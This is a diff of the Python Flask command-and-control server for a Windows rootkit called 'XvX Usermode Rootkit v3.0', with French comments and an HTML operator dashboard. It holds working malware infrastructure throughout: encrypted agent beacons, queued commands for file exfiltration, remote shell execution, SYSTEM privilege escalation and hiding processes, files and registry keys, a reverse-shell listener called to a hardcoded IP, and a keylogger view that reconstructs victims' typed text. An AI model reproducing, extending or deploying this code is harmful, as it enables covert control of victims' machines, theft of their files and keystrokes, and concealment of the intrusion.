@@ -1,11 +1,26 @@
 #!/usr/bin/env python3
 
 """
-XvX Usermode Rootkit - C2 Server
+XvX Usermode Rootkit v3.0 - C2 Server
 Copyright (c) 2025 - 28zaakypro@proton.me
 
 Flask HTTPS C2 server with web dashboard for agent management.
 Features: agent registration, task queuing, result collection, interactive SYSTEM shells.
+
+Supported Commands:
+  - exfil|<path>: File exfiltration
+  - shell|<cmd>: Execute shell command
+  - privesc: SYSTEM privilege escalation
+  - revshell_start/stop/input/output: Interactive shell
+  - hide_process|<name>: Hide process from Task Manager
+  - hide_file|<path>: Hide file/folder from Explorer
+  - hide_registry|<key>: Hide registry key from Regedit
+  - unhide_process|<name>: Unhide specific process
+  - unhide_file|<path>: Unhide specific file
+  - unhide_registry|<key>: Unhide specific registry key
+  - unhide_all: Unhide all hidden items
+  - sleep|<ms>: Change beacon interval
+  - die: Terminate rootkit
 """
 
 from flask import Flask, request, jsonify, render_template_string, send_file
@@ -19,50 +34,133 @@ import threading
 
 app = Flask(__name__)
 
-# Configuration
 DB_PATH = "c2.db"
 HOST = "0.0.0.0" 
 PORT = 8443
 SHELL_PORT = 4444
 
 def xor_encrypt(data: str, key: str) -> bytes:
-    """Chiffre une chaîne avec XOR et retourne bytes."""
-    key_bytes = key.encode('utf-16-le')
-    data_bytes = data.encode('utf-16-le')
+    """Chiffre une chaîne avec XOR (UTF-8) et retourne bytes."""
+    key_bytes = key.encode('utf-8')
+    data_bytes = data.encode('utf-8')
     result = bytearray()
     for i in range(len(data_bytes)):
         result.append(data_bytes[i] ^ key_bytes[i % len(key_bytes)])
     return bytes(result)
 
-def xor_decrypt(encrypted_wstring_bytes: bytes, key: str) -> str:
-    # Décoder les bytes UTF-16-LE en liste de wchar_t
-    encrypted_wchars = []
-    for i in range(0, len(encrypted_wstring_bytes), 2):
-        if i + 1 < len(encrypted_wstring_bytes):
-            wchar_code = encrypted_wstring_bytes[i] | (encrypted_wstring_bytes[i+1] << 8)
-            encrypted_wchars.append(wchar_code)
+def xor_decrypt(encrypted_bytes: bytes, key: str) -> str:
+    """Déchiffre des bytes XOR détecte automatiquement UTF-8 ou UTF-16-LE."""
+    null_count = encrypted_bytes.count(0)
+    is_utf16 = (null_count > len(encrypted_bytes) * 0.3)
     
-    # XOR avec la clé
+    if is_utf16:
+        encrypted_wchars = []
+        for i in range(0, len(encrypted_bytes), 2):
+            if i + 1 < len(encrypted_bytes):
+                wchar_code = encrypted_bytes[i] | (encrypted_bytes[i+1] << 8)
+                encrypted_wchars.append(wchar_code)
+        
+        result = []
+        key_len = len(key)
+        for i, enc_code in enumerate(encrypted_wchars):
+            key_code = ord(key[i % key_len])
+            decrypted_code = enc_code ^ key_code
+            result.append(chr(decrypted_code))
+        
+        return ''.join(result)
+    else:
+        key_bytes = key.encode('utf-8')
+        result = bytearray()
+        for i in range(len(encrypted_bytes)):
+            result.append(encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)])
+        return result.decode('utf-8', errors='ignore')
+
+def base64_decode_wstring(data: bytes) -> bytes:
+    """Décode Base64 depuis format UTF-8 (envoyé par le client C++)."""
+    try:
+        b64_string = data.decode('utf-8', errors='ignore')
+        return base64.b64decode(b64_string)
+    except Exception as e:
+        print(f"[ERROR] base64_decode_wstring failed: {e}")
+        return base64.b64decode(data)
+
+def clean_keylog(raw_keylog: str) -> str:
+    """
+    Interprète les touches brutes pour reconstruire le texte réel.
+    Gère: [BACKSPACE], [CAPSLOCK], [LEFT], [RIGHT], [DELETE], etc.
+    """
     result = []
-    key_len = len(key)
-    for i, enc_code in enumerate(encrypted_wchars):
-        key_code = ord(key[i % key_len])
-        decrypted_code = enc_code ^ key_code
-        result.append(chr(decrypted_code))
+    cursor_pos = 0
+    caps_lock_on = False
+    
+    i = 0
+    while i < len(raw_keylog):
+        # Détecter les touches spéciales entre crochets
+        if raw_keylog[i] == '[':
+            end_bracket = raw_keylog.find(']', i)
+            if end_bracket != -1:
+                key = raw_keylog[i:end_bracket+1]
+                
+                if key == '[BACKSPACE]':
+                    # Supprimer le caractère avant le curseur
+                    if cursor_pos > 0:
+                        result.pop(cursor_pos - 1)
+                        cursor_pos -= 1
+                
+                elif key == '[DELETE]':
+                    # Supprimer le caractère après le curseur
+                    if cursor_pos < len(result):
+                        result.pop(cursor_pos)
+                
+                elif key == '[CAPSLOCK]':
+                    caps_lock_on = not caps_lock_on
+                
+                elif key == '[LEFT]':
+                    # Déplacer curseur vers la gauche
+                    if cursor_pos > 0:
+                        cursor_pos -= 1
+                
+                elif key == '[RIGHT]':
+                    # Déplacer curseur vers la droite
+                    if cursor_pos < len(result):
+                        cursor_pos += 1
+                
+                elif key == '[ENTER]':
+                    # Nouvelle ligne
+                    result.insert(cursor_pos, '\n')
+                    cursor_pos += 1
+                
+                elif key == '[TAB]':
+                    # Tabulation
+                    result.insert(cursor_pos, '\t')
+                    cursor_pos += 1
+                
+                elif key in ['[SHIFT]', '[CTRL]', '[ALT]', '[WIN]']:
+                    pass
+                
+                else:
+                    result.insert(cursor_pos, key)
+                    cursor_pos += 1
+                
+                i = end_bracket + 1
+                continue
+        
+        char = raw_keylog[i]
+        
+        # Appliquer Caps Lock si activé (pour lettres minuscules)
+        if caps_lock_on and char.isalpha():
+            char = char.upper() if char.islower() else char.lower()
+        
+        result.insert(cursor_pos, char)
+        cursor_pos += 1
+        i += 1
     
     return ''.join(result)
 
-def base64_decode_wstring(data: bytes) -> bytes:
-    """Décode Base64 depuis format UTF-16-LE."""
-    b64_string = data.decode('utf-16-le', errors='ignore')
-    return base64.b64decode(b64_string)
-
-# Base de données SQLite
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     
-    # Table agents (victimes connectées)
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS agents (
             agent_id TEXT PRIMARY KEY,
@@ -75,7 +173,6 @@ def init_db():
         )
     """)
     
-    # Table tasks (commandes en attente)
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS tasks (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -87,7 +184,6 @@ def init_db():
         )
     """)
     
-    # Table results (résultats d'exécution)
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS results (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -100,13 +196,13 @@ def init_db():
         )
     """)
     
-    # Table keylogs (frappe clavier)
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS keylogs (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             agent_id TEXT,
             window_title TEXT,
             keystrokes TEXT,
+            cleaned_text TEXT,
             timestamp TEXT,
             FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
         )
@@ -129,7 +225,6 @@ def checkin():
         CMD1|ARG1|ARG2\nCMD2|ARG1\n...
     """
     try:
-        # Log encrypted checkin data
         raw_data = request.data
         print(f"\n[CHECKIN] ========== NEW REQUEST ==========")
         print(f"[CHECKIN] Received {len(raw_data)} bytes from {request.remote_addr}")
@@ -145,7 +240,7 @@ def checkin():
             ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in raw_data[i:i+32])
             print(f"  {i:04x}: {hex_part:48s}  {ascii_part}")
         
-        # Décoder Base64 (les données sont en UTF-16-LE)
+        # Décoder Base64
         try:
             encrypted_bytes = base64_decode_wstring(raw_data)
             print(f"[CHECKIN] Base64 decoded: {len(encrypted_bytes)} bytes")
@@ -154,11 +249,11 @@ def checkin():
             print(f"[ERROR] Base64 decode failed: {e}")
             return '', 400
         
-        # Essayer de déchiffrer avec plusieurs clés possibles
+        # Essayer de déchiffrer avec plusieurs clés pssible 
         # Format attendu: agent_id|hostname|username|os_version
         decrypted = None
         
-        # Si header X-Key-Hint présent, utiliser directement
+        # Si header présent, utiliser directement
         if key_hint:
             test_key = key_hint + "SecretKey2025"
             try:
@@ -180,7 +275,6 @@ def checkin():
                     test_key = f"{test_hostname}{test_user}SecretKey2025"
                     try:
                         test_decrypt = xor_decrypt(encrypted_bytes, test_key)
-                        # Check if looks like valid text (agent_id|...)
                         if '|' in test_decrypt and len(test_decrypt.split('|')) >= 4:
                             parts = test_decrypt.split('|')
                             # Vérifier que l'agent_id est en hex ASCII
@@ -194,7 +288,6 @@ def checkin():
                 if decrypted:
                     break
         
-        # If bruteforce fails, try to extract hostname from data
         if not decrypted:
             print(f"[ERROR] Bruteforce failed. Unable to decrypt.")
         
@@ -226,7 +319,7 @@ def checkin():
         
         now = datetime.now().isoformat()
         
-        # Récupérer IP du client
+        # Recup l'IP du client
         client_ip = request.remote_addr
         
         if exists:
@@ -268,17 +361,16 @@ def checkin():
             encrypted = xor_encrypt(response, agent_key)
             b64_response = base64.b64encode(encrypted).decode('ascii')
             print(f"[RESPONSE] Encrypted {len(b64_response)} base64 chars")
-            return b64_response.encode('utf-16-le'), 200
+            return b64_response.encode('utf-8'), 200
         else:
             print(f"[RESPONSE] No tasks, sending empty response")
-            return ''.encode('utf-16-le'), 200
+            return ''.encode('utf-8'), 200
         
     except Exception as e:
         print(f"[ERROR] /api/checkin: {e}")
         return '', 500
 
 # ENDPOINT: Résultat d'exécution
-
 @app.route('/api/result', methods=['POST'])
 def result():
     """
@@ -298,19 +390,17 @@ def result():
         if key_hint:
             print(f"[RESULT] Key hint: {key_hint}")
         
-        # Décoder base64
         try:
-            data_utf16 = raw_data.decode('utf-16-le', errors='ignore')
-            print(f"[RESULT] UTF-16 decoded: {data_utf16[:100]}")
+            encrypted_base64 = raw_data.decode('utf-8', errors='ignore').strip()
+            print(f"[RESULT] Base64 string (first 100 chars): {encrypted_base64[:100]}")
             
-            # Base64 decode
-            encrypted_bytes = base64.b64decode(data_utf16)
+            encrypted_bytes = base64.b64decode(encrypted_base64)
             print(f"[RESULT] Base64 decoded: {len(encrypted_bytes)} bytes")
+            print(f"[RESULT] Encrypted hex: {encrypted_bytes.hex()[:100]}")
         except Exception as e:
             print(f"[ERROR] Failed to decode: {e}")
             return '', 400
         
-        # Essayer de déchiffrer avec hint
         decrypted = None
         if key_hint:
             test_key = key_hint + "SecretKey2025"
@@ -323,7 +413,6 @@ def result():
             except Exception as e:
                 print(f"[ERROR] Key hint failed: {e}")
         
-        # Bruteforce if failed
         if not decrypted:
             print(f"[RESULT] Starting bruteforce...")
             for test_hostname in ["ZAAKY", "SANDBOX2", "ZAKAKY"]:
@@ -354,7 +443,6 @@ def result():
         
         agent_id, command_id, status, output = parts[0], parts[1], parts[2], parts[3]
         
-        # Stocker résultat
         conn = sqlite3.connect(DB_PATH)
         cursor = conn.cursor()
         
@@ -381,14 +469,12 @@ def result():
         return '', 500
 
 # ENDPOINT: Ping (test connexion)
-
 @app.route('/api/ping', methods=['POST'])
 def ping():
     """Test de connexion pour vérifier disponibilité du C2."""
     return 'PONG', 200
 
 # INTERFACE WEB: Liste des agents
-
 @app.route('/api/agents', methods=['GET'])
 def list_agents():
     """Retourner la liste des agents enregistrés."""
@@ -428,7 +514,6 @@ def list_agents():
         return jsonify({'error': str(e)}), 500
 
 # INTERFACE WEB: Envoyer commande
-
 @app.route('/api/command', methods=['POST'])
 def send_command():
     """
@@ -437,7 +522,7 @@ def send_command():
     JSON Body:
         {
             "agent_id": "abc123",
-            "command": "hide_process|malware.exe"
+            "command": "hide_process|malwaredemerde.exe"
         }
     """
     data = request.json
@@ -477,7 +562,6 @@ def download_privesc():
 
 
 # PRIVILEGE ESCALATION: Listener pour reverse shell SYSTEM
-
 active_shells = {}  # {agent_id: {'socket': socket, 'thread': thread}}
 
 def handle_reverse_shell(client_socket, agent_id):
@@ -485,10 +569,10 @@ def handle_reverse_shell(client_socket, agent_id):
     print(f"[PRIVESC] SYSTEM shell connected from {agent_id}")
     
     try:
-        client_socket.settimeout(10)  # Timeout de 10 secondes
+        client_socket.settimeout(10)
         
         while True:
-            # Lire la commande depuis la base de données
+            # Lire la commande depuis la DB
             conn = sqlite3.connect(DB_PATH)
             cursor = conn.cursor()
             
@@ -528,7 +612,6 @@ def handle_reverse_shell(client_socket, agent_id):
                                 break
                             client_socket.settimeout(10)
                     
-                    # Décoder en UTF-16-LE
                     try:
                         result = output.decode('utf-16-le', errors='ignore').strip('\x00').strip()
                     except:
@@ -546,7 +629,6 @@ def handle_reverse_shell(client_socket, agent_id):
                     VALUES (?, ?, 'success', ?, ?)
                 """, (agent_id, command, result or "[No output]", datetime.now().isoformat()))
                 
-                # Marquer tâche comme complétée
                 cursor.execute("UPDATE tasks SET status = 'completed' WHERE id = ?", (task_id,))
                 
                 conn.commit()
@@ -589,7 +671,6 @@ def start_shell_listener():
                 raw_agent_id = client_socket.recv(2048)
                 print(f"[PRIVESC] Received {len(raw_agent_id)} bytes: {raw_agent_id[:100].hex()}")
                 
-                # Essayer UTF-16-LE d'abord
                 try:
                     agent_id = raw_agent_id.decode('utf-16-le', errors='ignore').strip('\x00').strip()
                     print(f"[PRIVESC] Agent ID (UTF-16-LE): {agent_id}")
@@ -622,7 +703,6 @@ def start_shell_listener():
 
 
 # INTERFACE WEB: Liste des résultats
-
 @app.route('/api/results', methods=['GET'])
 def list_results():
     """Retourner la liste des résultats d'exécution."""
@@ -690,16 +770,22 @@ def list_keylogs():
         
         conn.close()
         
-        result = [{
-            'id': k[0],
-            'agent_id': k[1],
-            'command': k[2],
-            'status': k[3],
-            'output': k[4],
-            'received_at': k[5],
-            'hostname': k[6],
-            'ip_address': k[7]
-        } for k in keylogs]
+        result = []
+        for k in keylogs:
+            raw_output = k[4]
+            cleaned = clean_keylog(raw_output) if raw_output else ""
+            
+            result.append({
+                'id': k[0],
+                'agent_id': k[1],
+                'command': k[2],
+                'status': k[3],
+                'output': raw_output,
+                'cleaned_text': cleaned,
+                'received_at': k[5],
+                'hostname': k[6],
+                'ip_address': k[7]
+            })
         
         return jsonify(result)
     except Exception as e:
@@ -708,8 +794,9 @@ def list_keylogs():
         traceback.print_exc()
         return jsonify({'error': str(e)}), 500
 
-
-# INTERFACE WEB: Dashboard
+#===============================================================#
+#                INTERFACE WEB : DASHBOARD                      #
+#===============================================================#
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -717,7 +804,7 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate, max-age=0">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
     <title>XVX C2 Framework</title>
@@ -1888,14 +1975,32 @@ HTML_TEMPLATE = """
                         </select>
                         <select id="command-select">
                             <option value="">Select Module</option>
-                            <option value="hide_process|">Hide Process</option>
-                            <option value="hide_file|">Hide File</option>
-                            <option value="hide_registry|">Hide Registry</option>
-                            <option value="unhide_all">Unhide All</option>
-                            <option value="exfil|">Exfiltrate File</option>
-                            <option value="shell|">Execute Shell</option>
-                            <option value="privesc">Privilege Escalation</option>
-                            <option value="sleep|">Change Interval</option>
+                            <optgroup label="Stealth Operations">
+                                <option value="hide_process|">Hide Process</option>
+                                <option value="hide_file|">Hide File/Folder</option>
+                                <option value="hide_registry|">Hide Registry Key</option>
+                                <option value="unhide_process|">Unhide Process</option>
+                                <option value="unhide_file|">Unhide File</option>
+                                <option value="unhide_registry|">Unhide Registry Key</option>
+                                <option value="unhide_all">Unhide All</option>
+                            </optgroup>
+                            <optgroup label="Command Execution">
+                                <option value="shell|">Execute Shell Command</option>
+                                <option value="revshell_start">Start Interactive Shell</option>
+                                <option value="revshell_stop">Stop Interactive Shell</option>
+                                <option value="revshell_input|">Send Shell Input</option>
+                                <option value="revshell_output">Get Shell Output</option>
+                            </optgroup>
+                            <optgroup label="File Operations">
+                                <option value="exfil|">Exfiltrate File</option>
+                            </optgroup>
+                            <optgroup label="Privilege Escalation">
+                                <option value="privesc">Escalate to SYSTEM</option>
+                            </optgroup>
+                            <optgroup label="Configuration">
+                                <option value="sleep|">Change Beacon Interval (ms)</option>
+                                <option value="die">Terminate Rootkit</option>
+                            </optgroup>
                         </select>
                         <input type="text" id="command-arg" placeholder="arguments..." />
                         <button id="execute-btn" onclick="sendCommand()">EXECUTE</button>
@@ -1976,7 +2081,7 @@ HTML_TEMPLATE = """
             <div id="view-keylogger" class="view-panel">
                 <div class="section">
                     <div class="section-header">
-                        <div class="section-title">⌨ Keystroke Logs</div>
+                        <div class="section-title">Keystroke Logs</div>
                         <div style="display: flex; gap: 10px; align-items: center;">
                             <select id="keylog-agent-filter" onchange="loadKeylogs()" style="padding: 8px; background: var(--bg-dark); color: var(--text); border: 1px solid var(--border); border-radius: 4px; font-family: 'JetBrains Mono', monospace;">
                                 <option value="">All Agents</option>
@@ -2269,43 +2374,75 @@ HTML_TEMPLATE = """
                         // Display each keylog session
                         agentData.logs.forEach(log => {
                             const logBox = document.createElement('div');
-                            logBox.style.cssText = 'background: var(--bg); padding: 15px; margin-bottom: 10px; border-radius: 4px; border: 1px solid var(--border); font-family: monospace; font-size: 13px; white-space: pre-wrap; word-break: break-word;';
+                            logBox.style.cssText = 'background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 20px; margin-bottom: 15px; border-radius: 12px; border: 1px solid rgba(0, 255, 136, 0.2); box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); font-family: "Segoe UI", monospace; transition: all 0.3s ease;';
+                            logBox.onmouseenter = () => { logBox.style.borderColor = 'rgba(0, 255, 136, 0.6)'; logBox.style.boxShadow = '0 6px 20px rgba(0, 255, 136, 0.2)'; };
+                            logBox.onmouseleave = () => { logBox.style.borderColor = 'rgba(0, 255, 136, 0.2)'; logBox.style.boxShadow = '0 4px 15px rgba(0, 0, 0, 0.3)'; };
                             
                             // Timestamp header
                             const timestamp = document.createElement('div');
-                            timestamp.style.cssText = 'color: var(--text-muted); font-size: 11px; margin-bottom: 10px; border-bottom: 1px solid var(--border); padding-bottom: 5px;';
+                            timestamp.style.cssText = 'color: #00ff88; font-size: 11px; margin-bottom: 15px; padding-bottom: 8px; border-bottom: 1px solid rgba(0, 255, 136, 0.2); display: flex; align-items: center; gap: 8px; font-weight: 600;';
                             const date = new Date(log.received_at);
-                            timestamp.textContent = date.toLocaleString();
+                            timestamp.innerHTML = '<span style="font-size: 14px;"></span> ' + date.toLocaleString('fr-FR', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' });
                             logBox.appendChild(timestamp);
                             
                             // Parse and format output
                             const content = document.createElement('div');
-                            content.style.cssText = 'color: var(--text); line-height: 1.6;';
+                            content.style.cssText = 'color: var(--text); line-height: 1.8;';
                             
-                            // Split by lines and format
-                            const lines = log.output.split('\\n');
-                            lines.forEach(line => {
-                                const lineDiv = document.createElement('div');
-                                lineDiv.style.marginBottom = '5px';
+                            // Afficher CLEANED TEXT en premier (gros et visible)
+                            if (log.cleaned_text && log.cleaned_text.trim()) {
+                                const cleanedDiv = document.createElement('div');
+                                cleanedDiv.style.cssText = 'background: linear-gradient(135deg, #0a3d0a 0%, #1a5c1a 100%); border: 2px solid #00ff88; border-radius: 10px; padding: 20px; margin-bottom: 15px; box-shadow: 0 0 20px rgba(0, 255, 136, 0.3), inset 0 0 40px rgba(0, 255, 136, 0.1); position: relative; overflow: hidden;';
                                 
-                                // Highlight window titles
-                                if (line.includes('Window:')) {
-                                    lineDiv.style.cssText = 'color: var(--accent); font-weight: 600; margin-top: 10px; margin-bottom: 5px;';
-                                    lineDiv.textContent = line;
-                                } 
-                                // Highlight special keys
-                                else if (line.match(/\\[(ENTER|TAB|BACKSPACE|SPACE|SHIFT|CTRL|ALT|ESC|DELETE)\\]/)) {
-                                    lineDiv.style.cssText = 'color: #ffd700; background: rgba(255, 215, 0, 0.1); padding: 2px 6px; border-radius: 3px; display: inline-block;';
-                                    lineDiv.textContent = line;
-                                } 
-                                // Regular keystrokes
-                                else {
-                                    lineDiv.style.color = 'var(--text)';
-                                    lineDiv.textContent = line;
-                                }
+                                // Effet de brillance
+                                const shine = document.createElement('div');
+                                shine.style.cssText = 'position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.1) 50%, transparent 70%); pointer-events: none;';
+                                cleanedDiv.appendChild(shine);
                                 
-                                content.appendChild(lineDiv);
-                            });
+                                const cleanedLabel = document.createElement('div');
+                                cleanedLabel.style.cssText = 'color: #00ff88; font-size: 12px; text-transform: uppercase; margin-bottom: 12px; letter-spacing: 2px; font-weight: 800; display: flex; align-items: center; gap: 8px; text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);';
+                                cleanedLabel.innerHTML = '<span style="font-size: 16px;"></span> TEXTE DÉCHIFFRÉ';
+                                cleanedDiv.appendChild(cleanedLabel);
+                                
+                                const cleanedText = document.createElement('div');
+                                cleanedText.style.cssText = 'font-size: 16px; font-weight: 600; color: #ffffff; line-height: 1.8; white-space: pre-wrap; word-break: break-word; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5); position: relative; z-index: 1; font-family: "Courier New", monospace; letter-spacing: 0.5px;';
+                                cleanedText.textContent = log.cleaned_text;
+                                cleanedDiv.appendChild(cleanedText);
+                                
+                                content.appendChild(cleanedDiv);
+                            }
+                            
+                            // Afficher RAW OUTPUT en dessous (petit et discret, collapsible)
+                            const rawDiv = document.createElement('details');
+                            rawDiv.style.cssText = 'background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 8px; padding: 12px; font-size: 11px; color: var(--text-muted); cursor: pointer; transition: all 0.3s ease;';
+                            rawDiv.onmouseenter = () => { rawDiv.style.background = 'rgba(0, 0, 0, 0.5)'; };
+                            rawDiv.onmouseleave = () => { rawDiv.style.background = 'rgba(0, 0, 0, 0.3)'; };
+                            
+                            const rawSummary = document.createElement('summary');
+                            rawSummary.style.cssText = 'color: rgba(255, 255, 255, 0.5); font-size: 10px; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1.5px; font-weight: 600; display: flex; align-items: center; gap: 6px; user-select: none;';
+                            rawSummary.innerHTML = '<span style="font-size: 12px;">⚙</span> RAW KEYSTROKES (Debug)';
+                            rawDiv.appendChild(rawSummary);
+                            
+                            const rawText = document.createElement('div');
+                            rawText.style.cssText = 'color: rgba(255, 255, 255, 0.4); margin-top: 10px; white-space: pre-wrap; word-break: break-word; font-family: "Courier New", monospace; line-height: 1.6;';
+                            
+                            // Color-code special keys in raw output with unicode symbols
+                            let formattedRaw = log.output;
+                            formattedRaw = formattedRaw.split('[BACKSPACE]').join('<span style="color: #ff6b6b; font-weight: bold;">⌫</span>');
+                            formattedRaw = formattedRaw.split('[DELETE]').join('<span style="color: #ff6b6b; font-weight: bold;">⌦</span>');
+                            formattedRaw = formattedRaw.split('[ENTER]').join('<span style="color: #4ecdc4; font-weight: bold;">↵</span>');
+                            formattedRaw = formattedRaw.split('[TAB]').join('<span style="color: #95e1d3; font-weight: bold;">⇥</span>');
+                            formattedRaw = formattedRaw.split('[CAPSLOCK]').join('<span style="color: #ffd93d; font-weight: bold;">⇪</span>');
+                            formattedRaw = formattedRaw.split('[SHIFT]').join('<span style="color: #a8e6cf; font-weight: bold;">⇧</span>');
+                            formattedRaw = formattedRaw.split('[LEFT]').join('<span style="color: #6bcbef; font-weight: bold;">←</span>');
+                            formattedRaw = formattedRaw.split('[RIGHT]').join('<span style="color: #6bcbef; font-weight: bold;">→</span>');
+                            formattedRaw = formattedRaw.split('[UP]').join('<span style="color: #6bcbef; font-weight: bold;">↑</span>');
+                            formattedRaw = formattedRaw.split('[DOWN]').join('<span style="color: #6bcbef; font-weight: bold;">↓</span>');
+                            formattedRaw = formattedRaw.split('[SPACE]').join('<span style="color: #a8e6cf;">␣</span>');
+                            
+                            rawText.innerHTML = formattedRaw;
+                            rawDiv.appendChild(rawText);
+                            content.appendChild(rawDiv);
                             
                             logBox.appendChild(content);
                             container.appendChild(logBox);
@@ -2530,7 +2667,12 @@ HTML_TEMPLATE = """
                             let displayOutput = result.output;
                             if (displayOutput.startsWith('SHELL|')) {
                                 displayOutput = displayOutput.substring(6); // Enlève "SHELL|"
-                                displayOutput = displayOutput.replace(/\\nE\\s*$/, '').trim(); // Enlève "\\nE" final
+                                displayOutput = displayOutput.replace(/\\\\nE\\\\s*$/, '').trim(); // Enlève "\\nE" final
+                            }
+                            
+                            // Si c'est un keylog, ne pas l'afficher dans le shell (redirect vers Keylogger tab)
+                            if (result.command && result.command.startsWith('keylog_')) {
+                                return; // Skip keylogs dans le shell
                             }
                             
                             // Skip duplicatas par contenu
@@ -2668,13 +2810,14 @@ HTML_TEMPLATE = """
                                     output.appendChild(startLine);
                                     output.scrollTop = output.scrollHeight;
                                     
-                                    // Lancer revshell_start
+                                    // Lancer revshell_system (TCP reverse shell avec token SYSTEM)
                                     fetch('/api/command', {
                                         method: 'POST',
                                         headers: {'Content-Type': 'application/json'},
                                         body: JSON.stringify({
                                             agent_id: agent.agent_id,
-                                            command: 'revshell_start'
+                                            command: 'revshell_system',
+                                            args: '192.168.1.147:4444'
                                         })
                                     }).then(() => {
                                         let shellChecks = 0;
@@ -2684,7 +2827,7 @@ HTML_TEMPLATE = """
                                                 .then(results => {
                                                     const shellResult = results.find(r => 
                                                         r.agent_id === agent.agent_id && 
-                                                        r.command === 'revshell_start' &&
+                                                        r.command === 'revshell_system' &&
                                                         r.id > systemShellLastResultId
                                                     );
                                                     
@@ -3143,31 +3286,24 @@ def dashboard():
     response.headers['Expires'] = '0'
     return response
 
-# Main
-
 if __name__ == '__main__':
     print("[*] Initialisation C2 Server...")
     init_db()
     print(f"[+] Database created: {DB_PATH}")
     
-    # Générer certificat SSL auto-signé pour HTTPS
     if not os.path.exists('cert.pem') or not os.path.exists('key.pem'):
         print("[*] Génération certificat SSL auto-signé...")
         os.system('openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"')
     
-    # Démarrer le listener pour reverse shells SYSTEM en thread
     shell_listener_thread = threading.Thread(target=start_shell_listener, daemon=True)
     shell_listener_thread.start()
     
-    # Créer contexte SSL
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     context.load_cert_chain('cert.pem', 'key.pem')
     
-    # Afficher toutes les interfaces réseau disponibles
     print(f"\n[+] C2 Server running on https://{HOST}:{PORT}")
     print(f"[+] Dashboard: https://127.0.0.1:{PORT}")
     
-    # Afficher les IPs configurées dans c2_config.txt
     if os.path.exists('c2_config.txt'):
         print("\n[*] URLs C2 configurees:")
         with open('c2_config.txt', 'r') as f:
